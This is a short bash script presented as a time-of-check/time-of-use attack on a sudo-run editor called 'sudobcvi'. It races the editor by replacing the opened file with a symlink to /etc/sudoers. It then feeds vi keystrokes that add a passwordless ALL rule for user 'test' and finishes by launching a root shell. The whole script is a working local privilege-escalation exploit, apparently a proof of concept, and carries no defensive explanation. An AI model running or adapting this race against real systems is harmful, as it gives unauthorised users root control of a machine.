#!/bin/bash

## TOC-TOU attack on BCVI.

function write_sudoers {

    # wait for file to be replaced
    sleep 0.2

    # user test can run any command without a password
    sudoers="test	ALL=(ALL:ALL) NOPASSWD:ALL"

    # go to insert mode and enter the payload
    echo i"$sudoers"

    # escape, write, quit
    echo -e '\x1B:w\n:q\n'

}

# start up sudobcvi
touch f
write_sudoers | sudobcvi f &

# wait for sudobcvi to be loaded
sleep 0.1

# replace the normal file with a file with /etc/sudoers
rm f; ln -s /etc/sudoers f

# wait for sudoers to be overwritten
sleep 1

# we are root!
sudo rootshell
